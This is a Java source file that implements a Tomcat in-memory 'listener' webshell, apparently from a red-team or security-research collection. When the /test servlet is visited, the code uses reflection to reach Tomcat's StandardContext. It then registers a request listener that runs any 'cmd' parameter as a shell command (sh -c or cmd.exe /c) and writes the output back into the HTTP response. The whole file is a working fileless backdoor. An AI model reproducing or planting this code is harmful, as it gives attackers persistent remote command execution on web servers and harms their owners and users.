package tomcatShell.Listener;

import org.apache.catalina.connector.Request;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

@WebServlet("/test")
public class ListenerShell extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doPost(req, resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            //这里是反射获取ApplicationContext的context，也就是standardContext
            ServletContext servletContext = req.getSession().getServletContext();

            Field appctx = servletContext.getClass().getDeclaredField("context");
            appctx.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

            Field stdctx = applicationContext.getClass().getDeclaredField("context");
            stdctx.setAccessible(true);
            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

            ServletRequestListener listener = new ServletRequestListener() {
                @Override
                public void requestDestroyed(ServletRequestEvent sre) {
                }

                @Override
                public void requestInitialized(ServletRequestEvent sre) {
                    HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
                    try {
                        if (req.getParameter("cmd") != null) {
                            boolean isLinux = true;
                            String osTyp = System.getProperty("os.name");
                            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                                isLinux = false;
                            }
                            String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
                            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                            Scanner s = new Scanner(in).useDelimiter("\\A");
                            String out = s.hasNext() ? s.next() : "";
                            Field requestF = req.getClass().getDeclaredField("request");
                            requestF.setAccessible(true);
                            Request request = (Request) requestF.get(req);
                            request.getResponse().getWriter().write(out);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            };
            standardContext.addApplicationEventListener(listener);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
